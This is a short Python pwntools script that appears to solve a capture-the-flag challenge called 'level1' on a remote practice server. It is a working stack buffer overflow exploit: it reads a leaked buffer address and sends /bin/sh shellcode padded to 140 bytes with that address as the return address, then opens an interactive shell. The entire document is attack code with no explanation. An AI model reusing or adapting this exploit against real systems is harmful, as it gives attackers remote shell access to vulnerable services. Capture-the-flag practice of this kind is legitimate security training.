from pwn import *
#n = process('./level1')
n = remote('pwn2.jarvisoj.com', 9877)

offset = 140

n.recvuntil("What's this:")
buf_addr = n.recvuntil('?')[:-1]
print "buf_addr=" + buf_addr
buf_addr = int(buf_addr,16)
shellcode = asm(shellcraft.sh())

payload = shellcode
payload = (shellcode.ljust(140,'a'))
payload += p32(buf_addr)

n.sendline(payload)
n.interactive()
